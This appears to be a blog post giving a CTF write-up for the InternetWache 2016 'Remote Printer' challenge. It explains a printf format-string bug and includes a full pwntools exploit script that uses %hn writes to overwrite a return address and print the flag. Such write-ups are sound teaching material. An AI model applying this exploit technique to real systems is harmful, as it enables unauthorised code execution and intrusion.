<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="xil.se"><link rel=prev href=https://blog.xil.se/posts/internetwache-2016-exp70-kbeckmann/><link rel=next href=https://blog.xil.se/posts/internetwache-2016-rev60-kbeckmann/><link rel=canonical href=https://blog.xil.se/posts/internetwache-2016-exp80-kbeckmann/><link rel=apple-touch-icon sizes=180x180 href=https://blog.xil.se/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://blog.xil.se/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://blog.xil.se/favicon-16x16.png><link rel=manifest href=https://blog.xil.se/site.webmanifest><link rel=mask-icon href=https://blog.xil.se/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>InternetWache 2016 Remote Printer (Exploit 80) Writeup | Blog</title><meta name=title content="InternetWache 2016 Remote Printer (Exploit 80) Writeup | Blog"><link rel=stylesheet href=https://blog.xil.se/font/iconfont.css><link rel=stylesheet href=https://blog.xil.se/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.xil.se\/"},"articleSection":"posts","name":"InternetWache 2016 Remote Printer (Exploit 80) Writeup","headline":"InternetWache 2016 Remote Printer (Exploit 80) Writeup","description":"Problem  Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.\n (exp80, solved by 125)\nAttachment: exp80.zip\nService: 188.166.133.53:12377\nSolution This one was a bit harder. We are provided with a binary that listens on a port for incoming connections. When it gets a connection it reads an ip address and a port from the socket and connects to it.","inLanguage":"en-us","author":"kbeckmann","creator":"kbeckmann","publisher":"kbeckmann","accountablePerson":"kbeckmann","copyrightHolder":"kbeckmann","copyrightYear":"2016","datePublished":"2016-02-21 00:36:12 \u002b0100 \u002b0100","dateModified":"2016-02-21 00:36:12 \u002b0100 \u002b0100","url":"https:\/\/blog.xil.se\/posts\/internetwache-2016-exp80-kbeckmann\/","wordCount":"798","keywords":["Blog"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.xil.se/>Blog</a></div><div class="menu navbar-right"><a class=menu-item href=https://blog.xil.se/posts/>Blog</a>
<a class=menu-item href=https://blog.xil.se/categories/>Categories</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.xil.se/>Blog</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=https://blog.xil.se/posts/>Blog</a>
<a class=menu-item href=https://blog.xil.se/categories/>Categories</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">InternetWache 2016 Remote Printer (Exploit 80) Writeup</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.xil.se/author/kbeckmann rel=author>kbeckmann</a> with â™¥
<span class=post-time>on <time datetime=2016-02-21 itemprop=datePublished>February 21, 2016</time></span>
in
<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.xil.se/categories/writeups/>writeups</a></span></div></header><div class=post-content><h1 id=problem>Problem</h1><blockquote><p>Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task.</p></blockquote><p>(exp80, solved by 125)</p><p>Attachment: exp80.zip</p><p>Service: 188.166.133.53:12377</p><h1 id=solution>Solution</h1><p>This one was a bit harder. We are provided with a binary that listens on a port for incoming connections. When it gets a connection it reads an ip address and a port from the socket and connects to it. From the new socket, it reads the received bytes into the stack and prints it using printf(buf). Big bug here.</p><p>The buffer has the correct size but it&rsquo;s printed using printf(buf) which is obviously wrong.</p><p>Solution is to do a classic printf exploit which can be quite hard if you&rsquo;ve never done it before.</p><p>There is also an extra function that reads and prints the flag, let&rsquo;s call it <code>printflag</code>.</p><p>Our goal is to change the return address to <code>printflag</code>.</p><p>We start off by printing some stack values using <code>%p</code>. The pointers on the stack are constant even when running it multiple times, <code>0xffffbcec</code>. Good for us, no ASLR. We can use hard coded pointers/offsets into the stack.</p><p>Now we need to find where the return address is stored since we want to overwrite it. We can do this by using math or guessing/leaking data.</p><p><code>printf</code> has a nice feature which lets you access the stack at a specific position. <code>printf("%3$d", 1, 2, 3);</code> will print <code>3</code>. Abusing this, we can print way further down the stack.</p><p>I started out with an educated guess:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join((<span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;$p&#39;</span>) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2000</span>, <span style=color:#ae81ff>2100</span>))
</code></pre></div><p>This produces a format string that will print the contents of the stack at 2000<em>4 until 2100</em>4 bytes away from our current location.</p><p>Now we search the output and look for the return address. We know it is <code>0x08048776</code> because that&rsquo;s the location of the instruction after <code>call start_server</code> where we should return normally.</p><p>I found it at the 63rd print, which means the index is 2063. Using this we can calculate the address of the return address to <code>0xffffdd0c</code>. This is where we want to change bytes.</p><p>Now we just need to overwrite this value <code>&lt;main+0xAB> @ 0x08048776</code> with <code>&lt;printflag> @ 0x08048867</code>.</p><h1 id=arbitrary-write-with-printf>Arbitrary write with printf</h1><p>So how do we change bytes with printf? This is a fun challenge if you haven&rsquo;t done so before. There is an operation <code>%n</code> that will write the number of bytes printed to the memory where the current argument is pointing to.</p><p>It will write it as a 32 bit value which will overwrite the whole pointer, so we don&rsquo;t want that. By using <code>%hn</code> we only write a <em>half int</em> which is 16 bits. It will preserve the 16 highest bits of the value and overwrite the lowest 16 bits.</p><p>What about the value then? We can control the value that is written (number of bytes printed) by adding padding to a dummy print.</p><p>Since we are overwriting <code>0x08048776</code> with <code>0x08048867</code>, we only need to write <code>0x8776</code> as a 16 bit value. <code>printf</code> supports padding of basically any size! So we start off by printing a char with exactly 0x8776 bytes of padding. <code>%34919c</code> does the trick. Now we have printed 0x8776 characters, and this is the value that <code>%hn</code> will write.</p><p>We control the address where we want to write the value to by putting it into the buffer and refering to it. This part can be tricky and in this instance the offset was <code>11</code>. <code>%11$hn</code> will write the number of printed characters to the address that we put in our input string. We need to be careful and pad the input so the address appears at the correct location.</p><h1 id=full-exploit>Full exploit</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
<span style=color:#75715e>#context.log_level = 0</span>

<span style=color:#e6db74>&#39;&#39;&#39;
</span><span style=color:#e6db74>Want to change return address to 0x08048867 (printflag function)
</span><span style=color:#e6db74>It is normally pointing to main+0xAB == 0x08048776
</span><span style=color:#e6db74>0x08048776 =&gt;
</span><span style=color:#e6db74>0x08048867
</span><span style=color:#e6db74>LSB = 0x8867
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>

binary <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;./RemotePrinter&#39;</span>
context(os <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;linux&#39;</span>, arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;x86&#39;</span>)
elf <span style=color:#f92672>=</span> ELF(binary)

HOST<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;188.166.133.53&#39;</span>
PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>12377</span>
PWNHOST<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;your ip&gt;&#39;</span>
PWNPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>1024</span>

<span style=color:#75715e># local</span>
<span style=color:#75715e>#PWNHOST=&#39;127.0.0.1&#39;</span>
<span style=color:#75715e>#PWNPORT=1024</span>


l <span style=color:#f92672>=</span> listen(bindaddr<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;*&#39;</span>, port<span style=color:#f92672>=</span>PWNPORT)
<span style=color:#66d9ef>if</span> PWNHOST <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>:
    r <span style=color:#f92672>=</span> process(binary)
<span style=color:#66d9ef>else</span>:
    r <span style=color:#f92672>=</span> remote(HOST, PORT)
    r<span style=color:#f92672>.</span>sendline(PWNHOST)
    r<span style=color:#f92672>.</span>sendline(str(PWNPORT))

<span style=color:#75715e>#gdb.attach(r)</span>

c <span style=color:#f92672>=</span> l<span style=color:#f92672>.</span>wait_for_connection()

<span style=color:#75715e># got from leaking once</span>
stack <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffbcec</span> <span style=color:#75715e># Pointer to the input string on the stack</span>

payload <span style=color:#f92672>=</span> flat(
    flat(
        <span style=color:#e6db74>&#34;%&#34;</span>,            <span style=color:#75715e># Set number of printed bytes to</span>
        str(<span style=color:#ae81ff>0x8867</span>),    <span style=color:#75715e># 16 LSB of the address to printflag</span>
        <span style=color:#e6db74>&#34;c%&#34;</span>,
        str(<span style=color:#ae81ff>11</span>),        <span style=color:#75715e># Address is located at offset 11</span>
        <span style=color:#e6db74>&#34;$hn&#34;</span>           <span style=color:#75715e># &#34;h&#34; means half = 16 bits</span>
        )<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>16</span>),    <span style=color:#75715e># pad it so we can find the address below</span>
    <span style=color:#ae81ff>0xffffdd0c</span>,         <span style=color:#75715e># This is accessed with $11%n</span>
    <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
)

c<span style=color:#f92672>.</span>sendline(payload)

r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#39;</span>)
<span style=color:#66d9ef>print</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;}&#39;</span>)

</code></pre></div><p>YAY, FLAG: <strong>IW{YVO_F0RmaTt3d_RMT_Pr1nT3R}</strong></p><h1 id=references>References</h1><p>There&rsquo;s a <a href=https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf>very well written paper</a> from 2001 that explains everything you ever need to know about this.</p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
<span>xil.se</span></p><p class=copyright-item><span>Link:</span>
<a href=https://blog.xil.se/posts/internetwache-2016-exp80-kbeckmann/>https://blog.xil.se/posts/internetwache-2016-exp80-kbeckmann/</span></p></div><div class=post-tags><section><a href=javascript:window.history.back();>back</a></span> Â·
<span><a href=https://blog.xil.se/>home</a></span></section></div><div class=post-nav><a href=https://blog.xil.se/posts/internetwache-2016-exp70-kbeckmann/ class=prev rel=prev title="InternetWache 2016 FlagStore (Exploit 70) Writeup"><i class="iconfont icon-left"></i>&nbsp;InternetWache 2016 FlagStore (Exploit 70) Writeup</a>
<a href=https://blog.xil.se/posts/internetwache-2016-rev60-kbeckmann/ class=next rel=next title="InternetWache 2016 File Checker (Reverse 60) Writeup">InternetWache 2016 File Checker (Reverse 60) Writeup&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment></div></article></div></main><footer class=footer><div class=copyright>&copy;
<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.xil.se/>xil.se</a> |</span>
<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><script src=https://blog.xil.se/js/vendor_no_gallery.min.js async></script></div></body></html>